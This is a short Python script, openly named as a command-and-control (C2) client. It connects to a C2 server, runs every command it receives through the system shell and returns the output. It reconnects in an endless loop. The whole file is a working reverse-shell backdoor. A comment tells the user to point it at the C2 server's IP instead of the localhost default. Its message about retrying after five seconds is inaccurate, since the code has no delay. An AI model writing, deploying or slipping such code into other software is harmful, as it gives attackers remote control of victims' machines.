import socket
import subprocess

def connect_to_c2_server(host, port):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            print(f"[+] Connected to C2 Server at {host}:{port}")
            while True:
                command = client.recv(1024).decode()
                if command.lower() == "exit":
                    print("[-] Server requested disconnection. Closing connection...")
                    client.close()
                    break
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except subprocess.CalledProcessError as e:
                    output = f"Error: {e.output}"
                client.send(output.encode())
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
            client.close()

if __name__ == "__main__":
    SERVER_HOST = "127.0.0.1"  # Replace with the C2 server's IP if on a different machine
    SERVER_PORT = 9001
    connect_to_c2_server(SERVER_HOST, SERVER_PORT)
